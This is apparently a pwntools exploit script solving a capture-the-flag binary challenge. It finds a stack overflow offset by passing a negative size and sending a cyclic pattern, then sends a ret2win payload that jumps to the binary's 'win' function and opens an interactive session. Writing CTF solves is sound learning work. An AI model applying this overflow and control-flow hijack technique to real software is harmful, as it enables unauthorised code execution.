from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
context.arch = "amd64"

ret_gadget = ROP(elf).find_gadget(["ret"])[0]

io = process(elf.path)

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", b"-1")
io.send(cyclic(255, n=8))

io.wait()

core = io.corefile
offset = cyclic_find(p64(core.fault_addr), n=8)

success(f"Offset = {offset}")

io = process(elf.path)

payload = flat(
    b"A" * offset,
    ret_gadget,
    elf.sym.win,
)

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", b"-1")
io.send(payload)

io.interactive()
